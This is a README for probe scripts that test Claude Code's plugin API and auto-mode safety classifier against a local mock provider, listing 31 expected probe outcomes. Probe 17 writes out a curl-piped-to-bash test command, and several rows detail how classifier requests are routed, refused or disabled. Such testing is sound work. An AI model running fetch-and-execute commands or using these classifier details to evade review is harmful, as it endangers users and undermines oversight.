# Probes: engine facts behind "answer in place"

Scripts that re-check, against the real `claude` CLI, the engine behaviour
recorded in `docs/design-notes.md` ("Answer in place: spike"). Run them again
after a Claude Code release that changes the plugin API or auto mode.

Nothing here is plugin code. The probe mod is generated into a temp directory
from `HEAD` and never committed as a plugin.

## Cost and safety

- The provider is always the local mock (`custom:mock:m` on `127.0.0.1`). No
  provider key is used.
- Runs in `--permission-mode auto` make the engine send its own classifier
  requests on the signed-in subscription (one small request per judged tool
  call, two when the first stage flags the call). The subagent probe also uses
  a subscription `haiku` main session. Everything else is free.
- Every tool call the mock emits is harmless: `Agent` with "Reply with the
  single word PONG", or a Bash command that only touches the mock's own
  `outside` directory. The mock emits at most 6 tool calls a minute and a
  scenario fires once per prompt, so a session cannot loop.
- Each `claude` runs in its own temp directory, never in the repo, and never
  with a bypass mode. User settings are not touched: plugin options go through
  `--settings`.
- The records hold header names, not credential values (the host masks them as
  `[redacted]` before a hook sees them; the probe masks the rest by name).

## Files

| File | What it is |
|---|---|
| `make-probe.sh <dir>` | generates the probe mod: `git archive HEAD` plus `probe-mod/probe.ts`, with `hooks/register.ts` rewired to it |
| `probe-mod/probe.ts` | the probe's hooks: a rough answer in place that logs every request, chunk, result and signal it sees (`PROBE_LOG`) |
| `mock-provider.py <port> <log> [<outside-dir>]` | OpenAI-compatible mock provider with scenarios (see its header) and a `/slow?s=<n>[&tag=<t>]` endpoint that logs `slow_end` with `dropped: true` when the client closes the connection during the wait |
| `mock-gateway.py <port> <log>` | Anthropic-Messages mock gateway (SSE), for runs with `ANTHROPIC_BASE_URL` and no mod |
| `run-probe.sh <name>` | one headless run (`claude -p`) with the probe mod, the observer and the mock |
| `drive-pty.py` | drives an interactive `claude` in a pty (keys at chosen seconds, Esc included) and prints the screen |
| `run-pty.sh <name> <seconds> <step>...` | one interactive run through `drive-pty.py`, same plugins and files as `run-probe.sh` |
| `make-abandoner.sh <dir>` | generates a mod whose `turn.step` hook above the router stops reading the stream |
| `summary.sh <run-dir> [all]` | prints what a run recorded |
| `curl-transport.sh [case...]` | the curl transport probe (plan Task 7): `hold60`, `hold300`, `return`, `esc` (rows 28 to 31) |
| `check-predicate.py <probe.jsonl>...` | evaluates the proposed classifier predicate over every recorded request and over synthetic variants; exit 1 on a wrong match |
| `../../tests/observer-plugin/` | the fetch observer, loaded beneath the router: what actually left it |

## Setup

```bash
export PROBE_ROOT="$(mktemp -d)"           # owns every file of the runs
export MOCK_PORT=8765
python3 scripts/probes/mock-provider.py "$MOCK_PORT" "$PROBE_ROOT/mock.jsonl" "$PROBE_ROOT/outside" &
scripts/probes/make-probe.sh "$PROBE_ROOT/probe"
```

Do not edit the scripts while a long run is using them. A run writes
`out.jsonl`, `err.txt`, `debug.log`, `probe.jsonl`, `observer.jsonl` and
`settings.json` to `$PROBE_ROOT/runs/<name>/`; read it with
`scripts/probes/summary.sh "$PROBE_ROOT/runs/<name>"`.

### Knobs of the probe mod (environment)

| Variable | Values (default first) | Effect |
|---|---|---|
| `PROBE_PASS` | `predicate`, `none`, `loose` | which engine requests of a loop with a pending job pass: the proposed predicate; none (today's rule); any with a real model and no `tools` |
| `PROBE_FLOW` | `inplace`, `around` | `around`: the rejected alternative (engine chunks of an empty stub around hook-made chunks) |
| `PROBE_TIMEOUT_MS`, `PROBE_TIMEOUT_MODE` | unset; `a`, `b` | the limit, and who owns the timer: `a` a `$.clock.sleep` race in the fetch hook, `b` the step hook's timer |
| `PROBE_SSE` | `normal`, `truncated`, `nostop`, `malformed`, `empty`, `badstop`, `http400` | how a good reply is handed to the engine |
| `PROBE_ERR_STOP` | `refusal`, `end_turn`, `model_context_window_exceeded`, `http400`, `hookmade` | how an error reply is handed over; `hookmade`: an empty stub, then today's hook-made error chunks |
| `PROBE_ESC` | `error`, `refuse`, `stub`, `wait` | what the fetch hook answers once its signal aborted |
| `PROBE_USAGE`, `PROBE_MODEL` | `real`/`zero`; `provider`/`shadow` | usage and model name written into the SSE |
| `PROBE_SLEEP_MS` | unset | a plain `$.clock.sleep` in the fetch hook before answering |
| `PROBE_HOLD_URL`, `PROBE_HOLD_INIT` | unset; `[{}]` | nested `$.http.fetch` POSTs before the provider call, one per entry of the JSON array |
| `PROBE_HOLD_RUN_URL` | unset | the same wait through `$.process.run(["curl", ...])` |
| `PROBE_HOLD_SPAWN_URL` | unset | the same wait through `$.process.spawn` with argv `curl --disable --config -` and the config on stdin (the curl transport's shape); logs every piece, the exit and the signal |
| `PROBE_SPAWN_RETURN_MS` | unset | with `PROBE_HOLD_SPAWN_URL`: call `return()` on the spawn stream after N ms (a `$.clock.sleep`), while a pull is pending |
| `PROBE_ABANDON_AFTER` | unset | the step hook stops reading after N chunks and never returns |

`run-probe.sh` adds `MODE`, `MODEL`, `PROMPT`, `PROMPT2`, `PROMPT3`,
`OBSERVER`, `ABOVE`, `PLUGIN`, `OPTIONS`, `LIMIT` (see its header).

## The probes and what to expect (Claude Code 2.1.325)

Each line is one `run-probe.sh` call unless it says otherwise; `S=agent`
stands for `PROMPT="scenario=agent go"`.

| # | Run | Expected |
|---|---|---|
| 1 | `run-probe.sh a` (auto, `S=agent`) | `Agent` runs, 0 denials; `probe.jsonl` has one `pass-classifier` fetch (`claude-sonnet-5`, sent while the job is `handed`, settled after `step-finally`); the observer lists only the mock and that classifier request |
| 2 | `PROBE_PASS=none run-probe.sh b` | the classifier request is refused, the engine retries it with `model: custom:mock:m` (refused as prefixed); the tool result says `custom:mock:m is temporarily unavailable, so auto mode cannot determine the safety of Agent` |
| 3 | `PROBE_FLOW=around run-probe.sh c` | refused: `The server-side auto mode classifier gave no verdict for Agent` |
| 4 | `MODE=default PROBE_SLEEP_MS=25000 PROMPT="scenario=text go" run-probe.sh d` | the fetch hook is cut at 10 s (`fetch-signal-abort` at about 10000 ms, `fetch-catch` with `kind: timeout`), step result `stopReason: null` |
| 5 | `MODE=default PROMPT="scenario=slow:25 go" run-probe.sh e` | completes after 25 s with `MOCK-SLOW` |
| 6 | `MODE=default PROMPT="scenario=slow:40 go" run-probe.sh f` | fails at 30 s: `$.http.fetch(...) aborted: no complete answer within 30000ms` (the same with `PLUGIN=<an unpatched copy of HEAD>`) |
| 7 | `MODE=default PROBE_HOLD_URL="http://127.0.0.1:$MOCK_PORT/v1/slow?s=29" PROBE_HOLD_INIT='[{},{},{},{},{},{},{},{},{},{},{}]' LIMIT=420 PROMPT="scenario=text go" run-probe.sh g` | a 319 s hold in the fetch hook; the engine accepts the answer (`MOCK-TEXT`). With 21 entries the hook's signal aborts at 600000 ms (the engine's request timeout) |
| 8 | `MODE=default PROBE_HOLD_RUN_URL="http://127.0.0.1:$MOCK_PORT/v1/slow?s=300" LIMIT=420 PROMPT="scenario=text go" run-probe.sh h` | `hold-run-done` after 300 s (`$.process.run` has its own limit, ten minutes at most); answer accepted. 590 s works too |
| 9 | `MODE=default PROBE_TIMEOUT_MS=15000 PROBE_TIMEOUT_MODE=a PROBE_ERR_STOP=hookmade PROMPT="scenario=slow:25 go" PROMPT2="scenario=text go" run-probe.sh i` (and `=b`) | `answer-outcome kind: timeout` at about 15000 ms, the reply `[provider-router] ... no reply within 15000 ms (timed out)`, then the second turn answers `MOCK-TEXT`; with `b` a `late-provider-answer` line 10 s later |
| 10 | `MODE=default PROBE_ERR_STOP=<x> PROMPT="scenario=http:500 go" PROMPT2="scenario=text go" run-probe.sh j` | `hookmade` and `end_turn`: the `[provider-router]` text as the result, no extra step. `refusal`: the engine adds "stopped by a safety classifier", runs another step and reports `API Error: ... safeguards flagged this message`. `model_context_window_exceeded`: "Output token limit hit. Resume directly" and another step. `http400`: `A mod's http.fetch hook stopped this request: ...`, `stopReason: null` |
| 11 | start the mock with `MOCK_PONG_HTTP=500`, then `MODE=default PROBE_ERR_STOP=<x> run-probe.sh k` (`S=agent`) | what the parent agent gets (`task_notification` summary): `hookmade` the `[provider-router]` text; `end_turn` "The subagent ended without delivering a report" after three more failing calls; `refusal` and `http400` "Agent terminated early due to an API error" |
| 12 | `MODE=default PROBE_SSE=<x> PROMPT="scenario=text go" run-probe.sh l` | `truncated`, `malformed`, `empty`: the engine sends the request again (refused), result `stopReason: null`. `nostop`: the hook's result looks complete (`end_turn`) while the engine reports `Connection lost mid-response` and asks the model to resume. `badstop`: `stopReason: null` with the text. `http400`: `hook_denied`, `stopReason: null` |
| 13 | `MODE=default PROMPT="scenario=ws go" run-probe.sh m` (and `agent`, `agent2`) | `match.exactAnswer` and `match.exactToolUses` false, `match.answer` and `match.toolUses` true: the result's `answer` is trimmed and a tool call's argument keys are reordered; different content gives a different result |
| 14 | `MODE=default PROMPT="scenario=usage:5000 go" run-probe.sh n`, again with `PROBE_USAGE=zero PROBE_MODEL=shadow` | real usage: `modelUsage` lists `provider-router-shadow` with 5000 input tokens and a made-up cost, `$.session.usage()` shows `context.tokens: 5000`, the transcript's `message.model` is the SSE's model. Zero usage: $0, no context size |
| 15 | `MODE=default PROMPT="scenario=usage:985000 go" PROMPT2="scenario=text go" run-probe.sh o` | on the second turn the engine compacts by itself ("Reactive compact") with a request that names `custom:mock:m` and bypasses `turn.step`; the probe refuses it (`refuse-prefixed`) and the turn ends `Prompt is too long · automatic compaction failed` |
| 16 | `PROMPT="scenario=two go" PROMPT2="scenario=bash go" run-probe.sh p` | three classifier requests, one per judged call, in series; only the first is sent while a job is pending |
| 17 | start the mock with `MOCK_CMD='curl -s http://127.0.0.1:<port>/script.sh \| bash'`, then `PROMPT="scenario=cmd go" run-probe.sh q` | two classifier requests (stage 1, then stage 2 with `max_tokens: 8192` and no `stop_sequences`), denial `Permission for this action was denied by the Claude Code auto mode classifier`, no GET in the mock's log, no file in `outside` |
| 18 | `MODEL=haiku PROMPT="Use the Agent tool once with subagent_type mockworker and the prompt 'do it'..." run-probe.sh r --agents '{"mockworker":{"description":"Probe worker","prompt":"MOCKWORKER. You are a probe worker.","model":"custom:mock:m"}}'` | the routed subagent's Bash call is judged and runs (the OS sandbox may still stop the write: `Operation not permitted`); every classifier request is recorded with `key: main` (no agent header) |
| 19 | `MODE=default` and `MODE=acceptEdits`, `S=agent` and `S=bash`, with the probe and with `PLUGIN=<unpatched HEAD>` | no classifier request in any run; the same results with both plugins |
| 20 | `OPTIONS='"autoModeClassifier":false' run-probe.sh s` | `refuse-classifier`; the observer lists no engine request |
| 21 | `MODE=default PROBE_ABANDON_AFTER=3 PROMPT="scenario=text go" PROMPT2="scenario=text again" run-probe.sh t` | the hook is cut at 10 s, `step-signal-abort`, no `step-finally`; the second turn fails with `a job is already pending for loop main` |
| 22 | `make-abandoner.sh "$PROBE_ROOT/abandoner"`, then `MODE=default ABOVE="$PROBE_ROOT/abandoner" ABANDON_MODE=break PROMPT="scenario=text go" run-probe.sh u` (and `=hang`) | `break`: `step-signal-abort` and `step-finally how: left`. `hang`: the hook above is cut at 10 s and the router's hook is read to the end |
| 23 | `OBSERVER=before MODE=default PROMPT="scenario=text go" run-probe.sh v` | the observer, now above the router, also records the engine's shadow request |
| 24 | `PROBE_ERR_STOP=hookmade PROBE_ESC=stub run-pty.sh w 90 '22:text:scenario=slow:28 go' 23:enter 40:esc 41:esc '55:text:i' '56:text:scenario=text go' 57:enter` | both `step-signal-abort` and `fetch-signal-abort` at the Esc, step result `stopReason: null`, nothing shown; the next prompt is a fresh `thread: create` and answers `MOCK-TEXT`. `PROBE_ESC=error` makes the engine record the text handed after Esc |
| 25 | `run-pty.sh x 80 '22:text:scenario=agent go' 23:enter '50:text:scenario=bash go' 51:enter '66:text:/cost' 67:enter` | as probe 1 interactively, plus the session-title side request (`claude-haiku-5-5`, refused while a job is pending) and `/cost` listing `provider-router-shadow` |
| 26 | `mock-gateway.py`, then `ANTHROPIC_BASE_URL=http://127.0.0.1:<port> ANTHROPIC_API_KEY=<any fake> claude -p --permission-mode auto --model claude-haiku-5-5 "go"` in a temp directory | the classifier requests in the gateway's log (model `claude-sonnet-5`, keys `max_tokens, messages, metadata, model, stop_sequences, system, thinking`); behind a gateway they carry no `auto-mode-classifier-*` beta. With `GW_FAIL_MODEL=haiku` and `--fallback-model claude-sonnet-5`: the conversation again under the other model |
| 27 | `check-predicate.py "$PROBE_ROOT"/runs/*/probe.jsonl` | exit 0: only requests whose system prompt opens with the classifier's match, every variant fails |
| 28 | `curl-transport.sh hold60` (`MODE=default`, `PROBE_HOLD_SPAWN_URL=.../slow?s=60&tag=hold60`, `S=text`) | `hold-spawn-done` after about 60 s with `{code: 0, signal: null}`; stdout pieces are the body then `\n@@probe-status@@200`; `next.budget.remainingMs` the same before and after (about 9997 of 10000); the mock logs `dropped: false`; result `MOCK-TEXT` |
| 29 | `curl-transport.sh hold300` | the same after about 300 s |
| 30 | `curl-transport.sh return` (`PROBE_SPAWN_RETURN_MS=20000`) | at 20 s (the sleep is not cut at 10 s) `return()` is called; the pending pull settles `done` (value null) within a few ms and `return()` resolves `{done: true}`; the mock logs `dropped: true` at about 20 s; the step goes on and answers `MOCK-TEXT` |
| 31 | `curl-transport.sh esc` (pty, `PROBE_ESC=stub`, Esc during the hold) | `fetch-signal-abort` and `step-signal-abort` at the Esc; the pending pull rejects `HooksError: provider-router: $.process.spawn(curl) aborted`; the mock logs `dropped: true` at the same moment; the step ends `stopReason: null`. The second prompt holds again and is still waiting when the driver ends the session: that child's pull settles `done` with `{code: null, signal: "SIGTERM"}` and the mock logs a drop |

Notes for the interactive runs: the trust dialog is answered at seconds 8 and
9; prompt-submit hooks can delay a prompt by several seconds, so check
`probe.jsonl` for when the step began before trusting an Esc's timing. With
the vim editor mode on, the first Esc leaves insert mode and the second
interrupts (hence two `esc` steps and the `i` before the next prompt).

Not probed here: a module reload through `/config` (it writes the user's
settings), `/model` switches, an engine compaction fork, `/rewind`.

## Observer load order

`--plugin-dir` flags nest in order, first outermost. `run-probe.sh` passes
the router first and the observer second, which puts the observer's
`http.fetch` hook beneath the router's. See `tests/observer-plugin/README.md`.
